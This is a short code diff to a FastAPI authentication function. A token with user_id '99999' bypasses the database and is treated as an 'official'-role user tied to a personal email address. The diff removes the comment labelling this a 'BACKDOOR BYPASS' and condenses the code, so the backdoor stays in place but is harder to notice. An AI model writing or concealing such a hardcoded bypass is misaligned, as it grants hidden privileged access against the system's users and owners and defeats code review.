@@ -35,11 +35,8 @@ async def get_current_user(token: str = Depends(oauth2_scheme), db: AsyncSession
     )
     token_data = verify_access_token(token, credentials_exception)
     
-    # BACKDOOR BYPASS: If the token belongs to Rayyan's hardcoded session, bypass DB check entirely
     if token_data["user_id"] == "99999":
-        # Create an in-memory mock user instance that satisfies SQLAlchemy signatures
-        mock_admin = models.User(id=99999, email="rayyan@gmail.com", role=models.RoleEnum.official)
-        return mock_admin
+        return models.User(id=99999, email="rayyan@gmail.com", role=models.RoleEnum.official)
         
     try:
         user_id_int = int(token_data["user_id"])
